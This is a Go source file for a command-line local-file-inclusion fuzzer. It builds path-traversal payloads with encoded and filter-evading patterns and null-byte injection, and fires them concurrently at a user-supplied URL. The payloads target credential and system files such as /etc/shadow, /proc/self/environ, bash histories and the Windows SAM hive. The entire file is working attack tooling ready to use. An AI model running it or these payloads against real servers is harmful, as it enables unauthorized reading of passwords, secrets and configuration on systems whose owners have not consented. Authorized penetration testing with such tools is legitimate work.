package main

import (
	"encoding/json"
	"flag"
	"fmt"
	"os"
	"strings"
	"time"

	"go-lfi-fuzzer/fuzzer"
)

func main() {
	urlFlag := flag.String("u", "", "Target URL with FUZZ marker")
	concurrency := flag.Int("c", 50, "Concurrency")
	timeout := flag.Int("t", 5, "Timeout in seconds")
	osTarget := flag.String("os", "both", "Target OS (linux, windows, both)")
	maxDepth := flag.Int("depth", 8, "Max traversal depth")
	jsonOutput := flag.Bool("json", true, "Output as JSON")

	flag.Parse()

	if *urlFlag == "" {
		fmt.Fprintln(os.Stderr, "Error: -u (URL) is required")
		os.Exit(1)
	}

	// 1. Base Files
	linuxFiles := []string{
		"etc/passwd", "etc/shadow", "etc/hosts", "etc/group", "etc/hostname",
		"proc/self/environ", "proc/self/cmdline", "proc/self/status",
		"var/log/apache2/access.log", "var/log/nginx/access.log",
		"home/ubuntu/.bash_history", "root/.bash_history",
	}

	windowsFiles := []string{
		"windows/win.ini", "windows/system32/drivers/etc/hosts",
		"windows/system32/config/SAM", "boot.ini", "inetpub/wwwroot/web.config",
	}

	// 2. Traversal patterns
	patterns := []string{"../", "..%2f", "..%252f", "....//", "..\\", "..%5c"}

	var payloads []string

	targetFiles := linuxFiles
	if *osTarget == "windows" {
		targetFiles = windowsFiles
	} else if *osTarget == "both" {
		targetFiles = append(linuxFiles, windowsFiles...)
	}

	for _, file := range targetFiles {
		// Absolute path test
		if !strings.HasPrefix(file, "windows") {
			payloads = append(payloads, "/"+file)
		} else {
			payloads = append(payloads, "C:/"+file)
		}

		// Traversal tests
		for _, pattern := range patterns {
			traversal := ""
			for i := 1; i <= *maxDepth; i++ {
				traversal += pattern
				payloads = append(payloads, traversal+file)
				payloads = append(payloads, "/"+traversal+file)
			}
		}

		// Null byte injection
		payloads = append(payloads, "../../../"+file+"%00.html")
	}

	config := fuzzer.Config{
		URL:         *urlFlag,
		Payloads:    payloads,
		Concurrency: *concurrency,
		Timeout:     time.Duration(*timeout) * time.Second,
	}

	result := fuzzer.Run(config)

	if *jsonOutput {
		out, _ := json.MarshalIndent(result, "", "  ")
		fmt.Println(string(out))
	} else {
		fmt.Printf("LFI Scan complete. Hits: %d, OS: %s\n", len(result.Hits), result.Metadata.OSDetected)
		for _, h := range result.Hits {
			fmt.Printf("[%s] %s -> Found %s\n", h.Severity, h.Payload, h.FileFound)
		}
	}
}
